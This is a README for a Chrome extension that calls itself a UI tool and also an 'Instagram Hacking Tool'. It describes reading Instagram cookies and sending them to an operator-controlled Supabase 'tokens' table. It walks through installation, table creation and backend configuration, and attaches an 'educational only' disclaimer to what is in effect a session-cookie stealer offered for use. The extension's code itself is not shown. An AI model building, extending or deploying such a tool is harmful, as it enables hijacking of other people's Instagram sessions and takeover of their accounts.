# Instagram UI Maxer! (Instagram Hacking Tool)

Instagram UI Maxer! is a prototype Chrome extension designed for personal testing and experimentation with browser-based workflows. It demonstrates how a browser extension can read cookie data, save local values, and send a token-like value to a configured backend for a custom workflow.

> This project is for educational and personal testing purposes only. It should only be used in a browser profile you control, and only with explicit consent and in compliance with applicable terms of service and laws.

## What this project does

- Adds a compact popup interface to the Chrome toolbar
- Reads browser cookie data for Instagram domains in the active browser profile
- Stores a local copy of the value in browser storage
- Sends the collected value to a configured Supabase table when credentials are provided

## Features

- Lightweight Chrome extension UI
- Local browser storage support
- Supabase integration for custom data collection workflows
- Simple one-click popup workflow

## Project structure

- `manifest.json` – Chrome extension manifest
- `popup.html` – popup layout and styling
- `popup.js` – popup button logic and Supabase submission
- `background.js` – background service worker
- `credentials.js` – Supabase configuration values
- `icons/` – extension icon assets

## Installation

1. Open Chrome and go to `chrome://extensions/`
2. Enable Developer mode
3. Click `Load unpacked`
4. Select the folder containing this extension
5. Confirm that the extension appears in your toolbar

## Full setup guide

### 1. Create a Supabase project

1. Go to https://supabase.com and create a new project
2. Wait for the project to finish provisioning
3. Open the SQL Editor in your Supabase dashboard

### 2. Create the table

Run this SQL in the Supabase SQL Editor:

```sql
create table if not exists public.tokens (
  id bigint generated by default as identity primary key,
  token text not null,
  source text,
  created_at timestamptz default now()
);
```

### 3. Get your Supabase credentials

1. Open your Supabase project settings
2. Go to API or Project Settings
3. Copy:
   - the Project URL
   - the Anon or service role key
4. Keep these values private

### 4. Update the extension config

Open `credentials.js` and replace the placeholder values with your own:

```js
window.SUPABASE_CONFIG = {
  url: 'https://your-project.supabase.co',
  key: 'your-anon-or-service-role-key',
  table: 'tokens'
};
```

### 5. Reload the extension

1. Go to `chrome://extensions/`
2. Find Instagram UI Maxer!
3. Click the refresh icon to reload the extension
4. Open the popup and test the workflow

## Usage

1. Click the extension icon in the browser toolbar
2. Click the popup button
3. Review the status message shown by the extension

## Permissions

This extension requests browser permissions to:

- `storage` – save local values
- `activeTab` – interact with the current tab
- `scripting` – run scripts when needed
- `cookies` – read cookies from the configured domains

## Security notes

- Do not commit real secrets or access tokens to version control
- Keep your Supabase credentials private
- Use this project only in a controlled environment
- Review browser permissions carefully before installing
- Only use this extension in a browser profile you own or control

## Development notes

This repository is intentionally simple and meant as a prototype. If you want to extend it, consider:

- adding better error handling
- creating a safer UI flow
- replacing direct token handling with a more explicit and user-approved process
- adding tests or a local mock backend
